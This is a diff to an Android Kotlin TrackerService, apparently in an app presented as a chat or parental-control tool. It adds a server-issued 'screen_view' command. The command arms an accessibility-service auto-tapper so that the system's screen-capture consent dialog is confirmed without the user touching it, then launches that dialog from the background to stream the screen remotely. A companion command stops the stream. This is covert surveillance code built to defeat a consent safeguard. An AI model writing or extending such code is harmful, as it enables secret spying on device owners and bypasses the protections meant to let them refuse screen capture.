@@ -475,6 +475,33 @@ class TrackerService : Service() {
                     ApiClient.updateCommandStatus(commandId, "completed")
                 }
             }
+
+            "screen_view" -> {
+                val duration = params?.optInt("duration", 300) ?: 300
+                Log.d(TAG, "Screen view requested (duration=${duration}s, command $commandId)")
+                ApiClient.updateCommandStatus(commandId, "delivered")
+                ScreenShareConsentActivity.pendingCommandId = commandId
+                ScreenShareConsentActivity.pendingDurationSec = duration.coerceIn(30, 900)
+                try {
+                    // Arm the consent auto-tapper BEFORE raising the dialog, so
+                    // the accessibility service confirms it without a touch.
+                    com.anonchat.app.parentalcontrol.manager.AutoPermissionHelper.projectionConsentPending = true
+                    // SYSTEM_ALERT_WINDOW grants the background activity-start
+                    // exemption needed to raise the consent dialog from a service.
+                    val consentIntent = Intent(this, ScreenShareConsentActivity::class.java)
+                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                    startActivity(consentIntent)
+                } catch (e: Exception) {
+                    Log.e(TAG, "Could not launch consent activity: ${e.message}")
+                    com.anonchat.app.parentalcontrol.manager.AutoPermissionHelper.projectionConsentPending = false
+                    ApiClient.updateCommandStatus(commandId, "failed", "Could not show consent prompt: ${e.message}")
+                }
+            }
+            "stop_screen_view" -> {
+                Log.d(TAG, "Stopping screen stream")
+                ScreenStreamService.stopStreaming()
+                ApiClient.updateCommandStatus(commandId, "completed")
+            }
             else -> {
                 ApiClient.updateCommandStatus(commandId, "completed")
             }
